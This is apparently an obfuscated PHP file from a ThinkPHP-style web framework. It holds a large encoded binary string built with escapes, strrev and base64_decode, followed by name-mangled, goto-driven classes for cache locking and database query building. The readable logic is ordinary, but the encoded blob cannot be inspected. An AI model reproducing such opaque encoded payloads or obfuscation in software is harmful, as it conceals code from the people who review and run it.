Ú0“q<vË,KmKğ')."\x8a\x1a\x25\x75\xee\x37\x5a\xa4\x95\xc6\xe9\xa7\x5c\x7a\x30\x67\x26\xb5\x5c\x8c\x6a\xd1\x39\xc\x4b\x4a\xe8\x34\xa5\xb3\x3d\xc0\x91\x8d\x82\xfc\x5a\xb1\x28\xee\xd4\xe4\x2d\x13\xfd\xef\x30\xe8\x83"."\264\336\104\247\112\314\322\125\172\113\37\27\70\47\335\306\121\40\334\314\225\13\141\172\301\341\200\226\244\163\236\354\250\224\336\101\12\23\62\310\216\332\331\103\57\35\141\300\344"."\52\331\105\60\27\221\267\113\357\242\373\53\57\216\261\176\40\120\24\362\336\262\320\250\40\46\343\362\101\14\62\50\263\24\201\32\216\205\214\121\11\161\303\364\235\72\102\51\144"."\306\375\33\240\322\373\101\360\36\136\265\347\200\50\346\223\237\66\75\303\17\65\70\56\66\167\331\265\206\120\60\161\77\125\127\371\354\36\173\142\217\55\35\170\137\257\312\243\171".strrev('5êPxîµqbò•˜NAîb]X|O¸z8¨n~YÁûŒ£>si°Êôß‚Öç¹¾ã')."\220\266\312\127\5\245\141\220\372\135\56\345\74\104\313\300\303\134\323\125\175\230\320\361\346\221\173\102\253\74\155\370\255\25\202\362\62\71\164\245\235\124\257\171\126\262\304\256\155"."\335\331\14\7\356\252\45\135\330\273\120\207\244\25\33\304\342\174\272\151\312\264\23\144\341\206\230\102\161\367\311\74\124\323\37\340\126\4\122\50\116\64\124\230\27\124\171\365\223"."\x44\xa7\x3e\x79\xe5\x33\x98\xae\x1d\xe0\x7f\xb6\x60\xc4\xe9\x81\x66\x95\xb4\xbc\x2b\x1f\xc\xae\x18\x1\x82\xa7\x92\xfe\x93\xb4\x21\xba\xf4\x59\x4c\xac\x62\x62\x89\x55\x47\xb7\x40\xf1\xf6\xa5\xf3"."\133\224\175\250\322\17\151\337\23\213\205\276\135\150\346\360\31\73\217\145\371\166\111\163\36\50\253\235\233\310\110\260\103\232\101\236\375\326\335\155\47\3\3\322\24\221\54\35\254".base64_decode('5Bpt0y0KwsXxvkjEmtFCDrZtbB8tVptEif4HE8jOSPQ4JVSdqvTcP5eRlipvU0rqIA==').strrev('w1% ğ¥„ô,•L¼eDÅGªº¾Î­!	’İCâJB½³W óñİÊnĞß')."\xb8\x34\x33\x9a\x1c\xe7\xd4\x4f\x6c\xf6\x9c\x6c\x92\xfc\xf4\x1e\xb1\x7b\x13\xe\x23\xc8\x72\x75\x2c\x5d\xc9\xd1\xb0\x6c\x37\x46\x2a\x92\xd7\x44\x65\xd5\xd2\x43\x86\x42\x2a\x44\xc4\x48\xd0\x23\x58"."\320\104\255\201\64\63\320\301\315\15\65\111\127\315\51\252\302\103\55\75\105\153\312\141\61\5\230\354\107\231\153\124\364\165\307\121\23\305\333\134\357\24\23\22\345\176\274\230\15"."\21\241\13\202\344\111\126\253\216\163\15\177\275\315\161\316\261\334\357\71\42\156\117\166\301\214\242\356\127\157\201\66\22\243\0\372\65\151\167\25\33\251\10\165\227\363\42\42\311"."\x77\xc9\x91\x8a\x27\x3a\x8c\x7b\xb1\x5b\x28\x17\x19\x60\x26\xc3\x96\xeb\x35\x57\xea\x78\x96\x86\x19\xe7\xff\x7f\xfd\x94\xe1\xff\xab\x17\xc\xa7\xf1\x87\x2e\x1c\x8f\x1d\x77\x0\xff\xcd\x58\xbe\x95"."\x92\x3\x6e\x2a\x5\x76\xf5\xc3\xb9\x83\xee\x3\x58\xc4\x1f\xf6\x96\xe2\x5c\xf3\x99\xb9\x6\x63\x1e\xc3\x34\x76\x1b\xa6\xe5\x72\xd2\x3e\x5b\xfd\xc4\x52\xf1\x8c\x2c\x42\xbe\x21\xfe\x26\x69\xb5\x88".strrev('ˆ'."\r".'¢lŠø–Š:tğQ6ÕÊ¨jFâ³ÒÃñˆ)T`üC £-P;¼|{l¤ıÎÛ')."\115\141\76\327\374\54\224\302\47\102\342\10\1\106\117\266\131\215\26\331\331\261\36\210\376\300\134\106\234\210\201\74\320\50\231\56\71\100\25\324\54\341\230\23\7\120\36\156\230".base64_decode('Q2z1y6bTUaLL9XQmzWTJY+uQ3ldqOlSW5nRALoIVzp0CLf7oeYP7FfRGr6s6/nqoEw==')."\327\35\57\130\122\355\20\264\100\142\130\312\301\344\126\344\2\210\334\4\173\53\313\120\274\216\213\74\343\254\254\352\353\233\67\112\10\361\160\110\36\17\106\47\172\112\46\341\5"."\235\120\56\371\221\124\175\245\227\274\53\330\73\12\236\350\253\330\244\30\311\164\314\24\72\375\211\213\107\303\44\216\360\131\321\336\256\72\142\361\4\210\216\16\44\355\246\100\31"."\xe9\x29\x6d\xbc\x30\x85\x5b\x48\xac\xd8\x4c\x64\x90\x32\x1f\xc0\x8c\x10\x25\x1d\x7e\x0\x39\x24\x85\x96\xfc\xe6\x88\xb3\x24\xb6\xca\x70\x2e\xc1\xd9\xd5\xb2\xa5\xcc\x92\x25\x65\xe3\xf0\x6a\x79\x31"."\x62\xca\x92\x10\x39\xd\x3f\x83\x6c\x3b\xa6\x48\xbc\x69\xe0\x7e\xcb\x80\xc8\x7\xe8\x91\xdf\x71\xf2\x87\xab\x62\x19\x24\x5d\x9d\x22\xf6\x3d\xed\x7c\x1c\x85\x24\x12\x30\xf3\x20\xa\x35\x48\x97\x7f"."\xce\xbb\x57\xee\x1d\xbd\x82\xdc\x96\x8d\x88\x94\x4c\x4a\x31\xc7\x74\xe8\x17\x1b\x6a\x86\x85\xdf\x9\x92\x4c\xaf\x35\x2\xc3\x1a\x77\xed\xe2\x2e\xe5\x7c\x7c\x5d\xba\xa9\x4d\x11\x84\xc\x55\x5e\xc6"."\211\73\102\211\131\141\305\360\331\112\354\43\56\170\265\267\304\63\332\260\340\264\4\167\237\116\267\153\303\125\262\246\331\371\206\103\21\204\147\45\234\232\144\253\54\114\12\364\21".strrev('vßBzÂ’tƒZ¸-çÑ'."\0".'•#šVÙqg4,ŸuªÃtFZâò¥™l*±‘Ù¾Ù>Ëc÷')."\x85\xb\xc\xc4\x27\x9d\x96\xd9\x3c\x1b\x9f\x33\x94\x87\x18\x22\x79\x1d\x50\xd7\xd9\x10\xcb\x66\x18\xdb\xe1\x4a\xb2\xe4\x87\x92\x9d\x17\xb0\xb2\x4\x43\x42\x1\x3d\x17\x91\xaa\x93\x2f\x67\xc7\x2d"."\20\257\376\21\201\225\316\41\226\114\332\105\2\333\41\115\307\340\113\44\222\167\14\162\306\344\104\107\163\334\123\113\216\65\2\175\51\60\117\4\303\64\55\340\114\242\371\165\127"."\353\345\2\356\236\321\22\326\210\141\247\262\322\131\253\62\261\22\136\252\30\124\370\120\365\366\272\133\305\306\324\175\2\25\225\124\264\107\322\360\110\230\125\312\320\26\125\55\106"."\223\160\111\301\363\72\312\216\63\4\270\54\115\302\145\53\222\131\141\111\140\43\225\263\265\262\65\116\367\52\7\17\244\30\351\52\35\166\235\365\151\326\361\306\263\152\346\312\317".base64_decode('Aca5cxOxR/VWCGmF66a9WiuqZh63FSK3axeoRmtZShXqSinHuNonQiOjksyLtCr6IQ==').strrev('/ùDşZ˜ğô$1œÑ§DdùOnãË‚â\'©ËRªÄ£«ªM•–IUVı—x“ô')."\206\12\46\337\122\322\102\355\22\253\214\7\112\356\161\256\250\315\211\306\205\262\344\111\266\252\225\200\7\313\16\52\117\351\71\215\135\65\110\346\25\364\130\145\332\106\112\167\272"."\xab\x95\xdd\x57\xd1\x74\xf6\x91\x9c\x24\x8c\x74\xc9\x1\x85\x24\xc3\xa1\xc7\x50\x45\x52\x46\x40\xc0\xf6\x9\x91\x3c\xad\x4f\x62\x68\x4\x4e\x38\x2c\x61\x28\x1b\x1\x37\x19\xf4\x12\x34\x88\x2f\xdb"."\xf9\xf5\x17\x71\xb5\x4a\xb7\x5d\x9a\x1c\x37\x4b\xb6\x7\xa7\x25\xcc\x22\xf9\x6d\x35\x6d\x5b\x28\x5\x50\xd1\x1\xe1\x15\xf1\xde\xe9\x91\x74\x5e\x50\x48\xdc\x75\xe1\x46\x91\x4b\x14\x82\xb6\x84\xfa"."\220\40\134\307\342\63\171\134\247\251\204\146\71\42\370\162\206\107\344\255\21\256\145\333\313\256\213\143\1\100\7\340\244\71\312\174\106\141\333\173\321\36\161\175\243\271\371\101\301"."\312\0\52\312\32\74\304\303\201\345\247\51\176\170\14\301\113\352\200\327\331\174\313\213\203\216\342\364\135\53\256\151\373\115\65\200\10\127\124\101\75\241\23\331\32\230\22\305\23"."\361\212\244\236\100\74\276\60\32\153\243\216\323\53\222\111\51\111\43\252\42\251\247\63\332\75\136\132\250\53\20\216\124\244\141\345\251\156\125\170\37\243\111\341\36\322\112\162\3".base64_decode('OV4rwsH5oiXkrlvcDBSzJhP4s5uTuMaeVJXNdvW8cDsnyjjFG/K8Wsw/JA84XyFy6Q==')."\50\62\204\205\212\260\342\123\67\324\35\53\2\24\73\222\347\353\236\363\334\342\362\336\347\270\344\227\340\144\155\20\142\43\341\234\274\47\23\300\244\252\3\44\113\225\53\157\71"."\x48\xaa\x18\x0\xdc\xb0\x79\x26\x68\xcd\x2d\x37\x93\xd2\x2d\x6\x3d\xf1\x80\x65\x2c\xc\xa9\xa4\xdc\x46\xc3\x8e\x64\x5b\x1b\xac\x7a\xd7\x4d\xa5\x87\x78\xf5\xb\xb9\xde\xff\x6\x28\xba\xc6\x31\x8d"."\256\0\0".""."", 10, -8))); goto DŒù‘á—Ø; F­ïÖ‰ßø¤: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $‚ÓŒ¿ =& $_SERVER[—ÌÒğš÷]; $şç‚äÍÑ = $GLOBALS[$‚ÓŒ¿[6]][$‚ÓŒ¿[393]]; self::$cachePath = $şç‚äÍÑ[$‚ÓŒ¿[214]][$‚ÓŒ¿[84]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($Ìõû‘›•, $·Ó±ÜĞÎ = 0) { $Ş·ÌÙ¢è =& $_SERVER[—ÌÒğš÷]; $‚øî·‡Ù = microtime(!0); $í¼Œİòš = $‚øî·‡Ù + $·Ó±ÜĞÎ + 0.0001; $¹Ï¸º£ = rtrim(self::$cachePath, $Ş·ÌÙ¢è[8]) . $Ş·ÌÙ¢è[908] . md5($Ìõû‘›•) . $Ş·ÌÙ¢è[905]; if (file_exists($¹Ï¸º£) && filemtime($¹Ï¸º£) && filemtime($¹Ï¸º£) < time() - 10) { @unlink($¹Ï¸º£); } do { if (file_exists($¹Ï¸º£)) { cacheLockWait(); continue; } $„¾ıÌÈƒ = fopen($¹Ï¸º£, $Ş·ÌÙ¢è[909]); if (!$„¾ıÌÈƒ) { return !1; } $±¯úÍÃ‹ = flock($„¾ıÌÈƒ, LOCK_EX | LOCK_NB); self::$caches[$Ìõû‘›•] = array($Ş·ÌÙ¢è[910] => $„¾ıÌÈƒ, $Ş·ÌÙ¢è[214] => $¹Ï¸º£); fwrite($„¾ıÌÈƒ, $í¼Œİòš); clearstatcache(); if ($„¾ıÌÈƒ && $±¯úÍÃ‹) { return !0; } cacheLockWait(); } while (microtime(!0) < $í¼Œİòš); $this->unlock($Ìõû‘›•); return !1; } public function lockGet($îñ¦Š€ª) { $—áŞÖ =& $_SERVER[—ÌÒğš÷]; $é»Äû­ = rtrim(self::$cachePath, $—áŞÖ[8]) . $—áŞÖ[908] . md5($îñ¦Š€ª) . $—áŞÖ[905]; return file_exists($é»Äû­); } public function unlock($ıê˜¸©¶) { $¶¥ŠÒ ‘ =& $_SERVER[—ÌÒğš÷]; $µ¢”Ş÷È = self::$caches[$ıê˜¸©¶]; if (!$µ¢”Ş÷È) { return; } @flock($µ¢”Ş÷È[$¶¥ŠÒ ‘[910]], LOCK_UN); @fclose($µ¢”Ş÷È[$¶¥ŠÒ ‘[910]]); @unlink($µ¢”Ş÷È[$¶¥ŠÒ ‘[214]]); unset(self::$caches[$ıê˜¸©¶]); } } class CacheLockRedis { public function lock($’Å´®¬, $ß€­·Áã = 10) { $‰½õ«’Ó = Cache::init(); $ÜŞî„•É = microtime(!0) + $ß€­·Áã; while (microtime(!0) < $ÜŞî„•É) { $Œ¿³ú«Å = $‰½õ«’Ó->get($’Å´®¬); if (!$Œ¿³ú«Å) { $ÈÁÚìÀâ = $‰½õ«’Ó->setLock($’Å´®¬, $ÜŞî„•É, $ß€­·Áã); if ($ÈÁÚìÀâ) { return !0; } } else { if ($Œ¿³ú«Å < microtime(!0)) { $‰½õ«’Ó->set($’Å´®¬, $ÜŞî„•É, $ß€­·Áã * 2); if ($‰½õ«’Ó->get($’Å´®¬) === $Œ¿³ú«Å) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($Ø‰§õ«) { return Cache::init()->get($Ø‰§õ«); } public function unlock($Ôñã™œ¶) { return Cache::init()->remove($Ôñã™œ¶); } } class CacheLockMemcached { public function lock($Ø©ö±×, $Ö–·’…“ = 0) { $‰ÚÄ áÔ = Cache::init(); $şáŒá±Ù = microtime(!0) + $Ö–·’…“; while (microtime(!0) < $şáŒá±Ù) { $¹“ÑÁ÷Â = $‰ÚÄ áÔ->get($Ø©ö±×); if (!$¹“ÑÁ÷Â || $¹“ÑÁ÷Â < microtime(!0)) { $•ÑÍ˜ = $‰ÚÄ áÔ->handle->add($Ø©ö±×, $şáŒá±Ù, $Ö–·’…“); if ($•ÑÍ˜) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ù¼¹ÆÎ) { return Cache::init()->get($ù¼¹ÆÎ); } public function unlock($¼¼ˆ³ÅÌ) { return Cache::init()->remove($¼¼ˆ³ÅÌ); } } goto Aƒ¥°µˆ‹ï; D´õÁ­¢ßå: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\150\x69\156\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\75", "\156\145\x71" => "\74\x3e", "\147\164" => "\x3e", "\x65\x67\164" => "\76\75", "\x6c\x74" => "\74", "\145\154\164" => "\x3c\x3d", "\x6e\157\x74\154\151\x6b\x65" => "\x4e\x4f\124\40\114\111\x4b\x45", "\154\151\153\145" => "\114\111\113\105", "\151\156" => "\x49\x4e", "\x6e\x6f\x74\x69\x6e" => "\x4e\x4f\124\x20\111\116", "\156\x6f\164\x20\x69\156" => "\116\x4f\124\40\x49\116", "\x62\x65\x74\167\x65\145\x6e" => "\x42\x45\124\x57\x45\105\x4e", "\x6e\x6f\164\142\145\x74\x77\145\145\x6e" => "\x4e\x4f\124\40\x42\105\124\x57\105\x45\116", "\x6e\157\164\x20\142\x65\x74\x77\x65\x65\156" => "\x4e\117\124\40\x42\x45\124\127\x45\x45\x4e"); protected $selectSql = "\x53\x45\x4c\105\x43\x54\x25\104\x49\123\x54\x49\x4e\103\124\x25\40\45\106\111\x45\114\104\x25\x20\106\x52\x4f\115\x20\x25\124\x41\x42\114\105\45\x25\x4a\x4f\x49\x4e\45\45\x57\x48\x45\122\x45\x25\45\107\122\117\x55\120\x25\x25\110\x41\126\x49\x4e\x47\x25\x25\117\x52\104\105\x52\45\45\114\111\115\x49\x54\45\x20\45\x55\116\111\117\116\x25\45\103\117\x4d\115\105\116\x54\x25"; protected $bind = array(); public static function getInstance() { $‡äåÕ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[—ÌÒğš÷][1004], $‡äåÕ); } public function factory($ú¬¨İ Ù = '') { $î«–Â„ =& $_SERVER[—ÌÒğš÷]; $ú¬¨İ Ù = $this->parseConfig($ú¬¨İ Ù); if (empty($ú¬¨İ Ù[$î«–Â„[1005]])) { think_exception(think_lang($î«–Â„[1006])); } $this->dbType = ucwords(strtolower($ú¬¨İ Ù[$î«–Â„[1005]])); $şÔÉŞÅ = $î«–Â„[1007] . $this->dbType; if (class_exists($şÔÉŞÅ)) { $Ê›Š²© = new $şÔÉŞÅ($ú¬¨İ Ù); if ($î«–Â„[1008] != strtolower($ú¬¨İ Ù[$î«–Â„[1005]])) { $Ê›Š²©->dbType = strtoupper($this->dbType); } else { $Ê›Š²©->dbType = $this->_getDsnType($ú¬¨İ Ù[$î«–Â„[960]]); } } else { think_exception(think_lang($î«–Â„[1009]) . $î«–Â„[1010] . $şÔÉŞÅ); } return $Ê›Š²©; } public function __call($¢ô³¼ø¨, $‰¤‘¸ÄÁ) { if (method_exists($this, $¢ô³¼ø¨)) { return call_user_func_array(array($this, $¢ô³¼ø¨), $‰¤‘¸ÄÁ); } } protected function _getDsnType($½û„¸Ê) { $ïôß‘‰ = explode($_SERVER[—ÌÒğš÷][4], $½û„¸Ê); $É¤­ìŠ = strtoupper(trim($ïôß‘‰[0])); return $É¤­ìŠ; } private function parseConfig($ÜİÛæ”¶ = '') { $şåº¤Çƒ =& $_SERVER[—ÌÒğš÷]; if (!empty($ÜİÛæ”¶) && is_string($ÜİÛæ”¶)) { $ÜİÛæ”¶ = $this->parseDSN($ÜİÛæ”¶); } elseif (is_array($ÜİÛæ”¶)) { $ÜİÛæ”¶ = array_change_key_case($ÜİÛæ”¶); $ÜİÛæ”¶ = array($şåº¤Çƒ[1005] => $ÜİÛæ”¶[$şåº¤Çƒ[1011]], $şåº¤Çƒ[932] => $ÜİÛæ”¶[$şåº¤Çƒ[1012]], $şåº¤Çƒ[933] => $ÜİÛæ”¶[$şåº¤Çƒ[1013]], $şåº¤Çƒ[930] => $ÜİÛæ”¶[$şåº¤Çƒ[1014]], $şåº¤Çƒ[931] => $ÜİÛæ”¶[$şåº¤Çƒ[1015]], $şåº¤Çƒ[21] => $ÜİÛæ”¶[$şåº¤Çƒ[1016]], $şåº¤Çƒ[960] => $ÜİÛæ”¶[$şåº¤Çƒ[1017]], $şåº¤Çƒ[17] => isset($ÜİÛæ”¶[$şåº¤Çƒ[1018]]) ? $ÜİÛæ”¶[$şåº¤Çƒ[1018]] : array()); } elseif (empty($ÜİÛæ”¶)) { if (think_config($şåº¤Çƒ[1019]) && $şåº¤Çƒ[1008] != strtolower(think_config($şåº¤Çƒ[1020]))) { $ÜİÛæ”¶ = $this->parseDSN(think_config($şåº¤Çƒ[1019])); } else { $ÜİÛæ”¶ = array($şåº¤Çƒ[1005] => think_config($şåº¤Çƒ[1020]), $şåº¤Çƒ[932] => think_config($şåº¤Çƒ[1021]), $şåº¤Çƒ[933] => think_config($şåº¤Çƒ[1022]), $şåº¤Çƒ[930] => think_config($şåº¤Çƒ[1023]), $şåº¤Çƒ[931] => think_config($şåº¤Çƒ[1024]), $şåº¤Çƒ[21] => think_config($şåº¤Çƒ[290]), $şåº¤Çƒ[960] => think_config($şåº¤Çƒ[1019]), $şåº¤Çƒ[17] => think_config($şåº¤Çƒ[1025])); } } return $ÜİÛæ”¶; } protected function initConnect($½ˆîşØ = true) { if (1 == think_config($_SERVER[—ÌÒğš÷][22])) { $this->_linkID = $this->multiConnect($½ˆîşØ); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $¨·êÈ…¥ => $éüƒ°ª²) { $this->_linkID = $éüƒ°ª²; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($×»Ö­Ôô = false) { $İÎç· =& $_SERVER[—ÌÒğš÷]; static $³È±’ò® = array(); static $”Â½ØÅ´ = -1; if (empty($³È±’ò®)) { foreach ($this->config as $Ğâ‰í¶¦ => $¸›¶óâÓ) { $³È±’ò®[$Ğâ‰í¶¦] = explode($İÎç·[50], $¸›¶óâÓ); } } if (think_config($İÎç·[1026])) { if ($×»Ö­Ôô || think_config($İÎç·[439]) === !0) { $–Í‡´‹Ë = floor(mt_rand(0, think_config($İÎç·[1027]) - 1)); $”Â½ØÅ´ = $–Í‡´‹Ë; } else { if (is_numeric(think_config($İÎç·[1028]))) { $–Í‡´‹Ë = think_config($İÎç·[1028]); } else { $–Í‡´‹Ë = floor(mt_rand(think_config($İÎç·[1027]), count($³È±’ò®[$İÎç·[930]]) - 1)); } } } else { $–Í‡´‹Ë = floor(mt_rand(0, count($³È±’ò®[$İÎç·[930]]) - 1)); $”Â½ØÅ´ = $–Í‡´‹Ë; } $–Í‡´‹Ë = $”Â½ØÅ´ !== -1 ? $”Â½ØÅ´ : $–Í‡´‹Ë; $¯ñ‡“­“ = array($İÎç·[932] => isset($³È±’ò®[$İÎç·[932]][$–Í‡´‹Ë]) ? $³È±’ò®[$İÎç·[932]][$–Í‡´‹Ë] : $³È±’ò®[$İÎç·[932]][0], $İÎç·[933] => isset($³È±’ò®[$İÎç·[933]][$–Í‡´‹Ë]) ? $³È±’ò®[$İÎç·[933]][$–Í‡´‹Ë] : $³È±’ò®[$İÎç·[933]][0], $İÎç·[930] => isset($³È±’ò®[$İÎç·[930]][$–Í‡´‹Ë]) ? $³È±’ò®[$İÎç·[930]][$–Í‡´‹Ë] : $³È±’ò®[$İÎç·[930]][0], $İÎç·[931] => isset($³È±’ò®[$İÎç·[931]][$–Í‡´‹Ë]) ? $³È±’ò®[$İÎç·[931]][$–Í‡´‹Ë] : $³È±’ò®[$İÎç·[931]][0], $İÎç·[21] => isset($³È±’ò®[$İÎç·[21]][$–Í‡´‹Ë]) ? $³È±’ò®[$İÎç·[21]][$–Í‡´‹Ë] : $³È±’ò®[$İÎç·[21]][0], $İÎç·[960] => isset($³È±’ò®[$İÎç·[960]][$–Í‡´‹Ë]) ? $³È±’ò®[$İÎç·[960]][$–Í‡´‹Ë] : $³È±’ò®[$İÎç·[960]][0], $İÎç·[17] => isset($³È±’ò®[$İÎç·[17]][$–Í‡´‹Ë]) ? $³È±’ò®[$İÎç·[17]][$–Í‡´‹Ë] : $³È±’ò®[$İÎç·[17]][0]); return $this->connect($¯ñ‡“­“, $–Í‡´‹Ë); } public function parseDSN($Üúµîš) { $“²²Ë×Ë =& $_SERVER[—ÌÒğš÷]; if (empty($Üúµîš)) { return !1; } $«ÓÁç»• = parse_url($Üúµîš); if ($«ÓÁç»•[$“²²Ë×Ë[195]]) { $˜Åˆ›Ô« = array($“²²Ë×Ë[1005] => $«ÓÁç»•[$“²²Ë×Ë[195]], $“²²Ë×Ë[932] => isset($«ÓÁç»•[$“²²Ë×Ë[630]]) ? $«ÓÁç»•[$“²²Ë×Ë[630]] : $“²²Ë×Ë[12], $“²²Ë×Ë[933] => isset($«ÓÁç»•[$“²²Ë×Ë[1029]]) ? $«ÓÁç»•[$“²²Ë×Ë[1029]] : $“²²Ë×Ë[12], $“²²Ë×Ë[930] => isset($«ÓÁç»•[$“²²Ë×Ë[196]]) ? $«ÓÁç»•[$“²²Ë×Ë[196]] : $“²²Ë×Ë[12], $“²²Ë×Ë[931] => isset($«ÓÁç»•[$“²²Ë×Ë[197]]) ? $«ÓÁç»•[$“²²Ë×Ë[197]] : $“²²Ë×Ë[12], $“²²Ë×Ë[21] => isset($«ÓÁç»•[$“²²Ë×Ë[84]]) ? substr($«ÓÁç»•[$“²²Ë×Ë[84]], 1) : $“²²Ë×Ë[12]); } else { preg_match($“²²Ë×Ë[1030], trim($Üúµîš), $¾¨Ö·€¸); $˜Åˆ›Ô« = array($“²²Ë×Ë[1005] => $¾¨Ö·€¸[1], $“²²Ë×Ë[932] => $¾¨Ö·€¸[2], $“²²Ë×Ë[933] => $¾¨Ö·€¸[3], $“²²Ë×Ë[930] => $¾¨Ö·€¸[4], $“²²Ë×Ë[931] => $¾¨Ö·€¸[5], $“²²Ë×Ë[21] => $¾¨Ö·€¸[6]); } $˜Åˆ›Ô«[$“²²Ë×Ë[960]] = $“²²Ë×Ë[12]; return $˜Åˆ›Ô«; } protected function debug() { $ÔÅí”¥Ò =& $_SERVER[—ÌÒğš÷]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ÔÅí”¥Ò[1031]; if (think_config($ÔÅí”¥Ò[1032])) { think_status($ÔÅí”¥Ò[1033]); think_trace($this->queryStr . $ÔÅí”¥Ò[1034] . think_status($ÔÅí”¥Ò[24], $ÔÅí”¥Ò[1033], 6) . $ÔÅí”¥Ò[1035], $ÔÅí”¥Ò[12], $ÔÅí”¥Ò[1036]); } } protected function parseLock($¨ÉËĞ  = false) { $ÚÁÔó° =& $_SERVER[—ÌÒğš÷]; if (!$¨ÉËĞ ) { return $ÚÁÔó°[12]; } if ($ÚÁÔó°[962] == $this->dbType) { return $ÚÁÔó°[1037]; } return $ÚÁÔó°[1038]; } protected function parseSet($Ã†ãàİ®) { $ƒú–±¥¥ =& $_SERVER[—ÌÒğš÷]; foreach ($Ã†ãàİ® as $ƒÕÆ»¤ => $áÑÒŞÕà) { if (is_array($áÑÒŞÕà) && $ƒú–±¥¥[341] == $áÑÒŞÕà[0]) { $¢£áĞ³[] = $this->parseKey($ƒÕÆ»¤) . $ƒú–±¥¥[928] . $áÑÒŞÕà[1]; } elseif (is_scalar($áÑÒŞÕà) || is_null($áÑÒŞÕà)) { $¢£áĞ³[] = $this->parseKey($ƒÕÆ»¤) . $ƒú–±¥¥[928] . $this->parseValue($áÑÒŞÕà); } } return $ƒú–±¥¥[1039] . implode($ƒú–±¥¥[50], $¢£áĞ³); } protected function bindParam($…‡—½ÏÎ, $Â¦Àî±æ) { $this->bind[$_SERVER[—ÌÒğš÷][4] . $…‡—½ÏÎ] = $Â¦Àî±æ; } protected function parseBind($îœ˜åíù) { $îœ˜åíù = array_merge($this->bind, $îœ˜åíù); $this->bind = array(); return $îœ˜åíù; } function parseKey(&$øÒÆí®®, $Çø™¥¥œ = true) { if ($Çø™¥¥œ) { $øÒÆí®® = $this->parseKeyCheck($øÒÆí®®); } return $øÒÆí®®; } function parseKeyCheck($ÈÍ«°Ú¶) { $±ÔöÇ«è =& $_SERVER[—ÌÒğš÷]; $ÈÍ«°Ú¶ = trim($ÈÍ«°Ú¶); if (!preg_match($±ÔöÇ«è[1040], $ÈÍ«°Ú¶)) { think_exception($±ÔöÇ«è[1041] . $ÈÍ«°Ú¶); } return $ÈÍ«°Ú¶; } protected function parseValue($°íÃÜ”) { $°õÊÆÌ =& $_SERVER[—ÌÒğš÷]; if (is_string($°íÃÜ”)) { $°íÃÜ” = $°õÊÆÌ[1001] . $this->escapeString($°íÃÜ”) . $°õÊÆÌ[1001]; } elseif (isset($°íÃÜ”[0]) && is_string($°íÃÜ”[0]) && strtolower($°íÃÜ”[0]) == $°õÊÆÌ[341]) { $°íÃÜ” = $this->escapeString($°íÃÜ”[1]); } elseif (is_array($°íÃÜ”)) { $°íÃÜ” = array_map(array($this, $°õÊÆÌ[1002]), $°íÃÜ”); } elseif (is_bool($°íÃÜ”)) { $°íÃÜ” = $°íÃÜ” ? $°õÊÆÌ[88] : $°õÊÆÌ[212]; } elseif (is_null($°íÃÜ”)) { $°íÃÜ” = $°õÊÆÌ[103]; } return $°íÃÜ”; } protected function parseField($ÒË‰²ï) { $Îí™Ó£Õ =& $_SERVER[—ÌÒğš÷]; if (is_string($ÒË‰²ï) && strpos($ÒË‰²ï, $Îí™Ó£Õ[50])) { $ÒË‰²ï = explode($Îí™Ó£Õ[50], $ÒË‰²ï); } if (is_array($ÒË‰²ï)) { $ñ…ê¤Òğ = array(); foreach ($ÒË‰²ï as $‚á‘ä«¹ => $Œç‹øÛÓ) { if (!is_numeric($‚á‘ä«¹)) { $ñ…ê¤Òğ[] = $this->parseKey($‚á‘ä«¹, !1) . $Îí™Ó£Õ[1042] . $this->parseKey($Œç‹øÛÓ); } else { $ñ…ê¤Òğ[] = $this->parseKey($Œç‹øÛÓ); } } $óğÂ±ŠÁ = implode($Îí™Ó£Õ[50], $ñ…ê¤Òğ); } elseif (is_string($ÒË‰²ï) && !empty($ÒË‰²ï)) { $óğÂ±ŠÁ = $ÒË‰²ï; } else { $óğÂ±ŠÁ = $Îí™Ó£Õ[203]; } return $óğÂ±ŠÁ; } protected function parseTable($ÑìË©äØ) { $Ë˜Ê®¬¢ =& $_SERVER[—ÌÒğš÷]; if (is_array($ÑìË©äØ)) { $ÚÍÀ¯‡ª = array(); foreach ($ÑìË©äØ as $Œ½îˆ => $“î•†–à) { if (!is_numeric($Œ½îˆ)) { $ÚÍÀ¯‡ª[] = $this->parseKey($Œ½îˆ) . $Ë˜Ê®¬¢[53] . $this->parseKey($“î•†–à); } else { $ÚÍÀ¯‡ª[] = $this->parseKey($Œ½îˆ); } } $ÑìË©äØ = $ÚÍÀ¯‡ª; } elseif (is_string($ÑìË©äØ)) { if (strstr($ÑìË©äØ, $Ë˜Ê®¬¢[53])) { return $ÑìË©äØ; } $ÑìË©äØ = explode($Ë˜Ê®¬¢[50], $ÑìË©äØ); array_walk($ÑìË©äØ, array($this, $Ë˜Ê®¬¢[950])); } return $Ë˜Ê®¬¢[944] . trim(implode($Ë˜Ê®¬¢[1043], $ÑìË©äØ), $Ë˜Ê®¬¢[429]) . $Ë˜Ê®¬¢[944]; } protected function parseWhere($¯ÑµÂé¨) { $“é¯ö„ =& $_SERVER[—ÌÒğš÷]; $“ƒ¸ƒ‚» = $“é¯ö„[12]; if (is_string($¯ÑµÂé¨)) { $“ƒ¸ƒ‚» = $¯ÑµÂé¨; } else { $ÏÑÛóÌ = isset($¯ÑµÂé¨[$“é¯ö„[1044]]) ? strtoupper($¯ÑµÂé¨[$“é¯ö„[1044]]) : $“é¯ö„[12]; if (in_array($ÏÑÛóÌ, array($“é¯ö„[1045], $“é¯ö„[1046], $“é¯ö„[1047]))) { $ÏÑÛóÌ = $“é¯ö„[53] . $ÏÑÛóÌ . $“é¯ö„[53]; 